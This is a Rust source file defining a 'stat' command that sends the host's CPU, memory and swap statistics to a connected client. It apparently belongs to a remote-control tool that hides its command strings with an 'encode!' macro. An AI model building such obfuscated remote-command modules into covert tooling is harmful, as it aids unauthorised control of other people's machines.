use super::prelude::*;
use crate::utils;

pub struct Stat;

#[async_trait]
impl Command for Stat {
    fn name(&self) -> &'static str {
        encode!("stat")
    }

    fn help(&self) -> &'static str {
        encode!("sending pc stats (CPU, Memory and Swap)")
    }

    fn min_args(&self) -> usize {
        0
    }

    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        Ok(client.send(&utils::stat())?)
    }
}
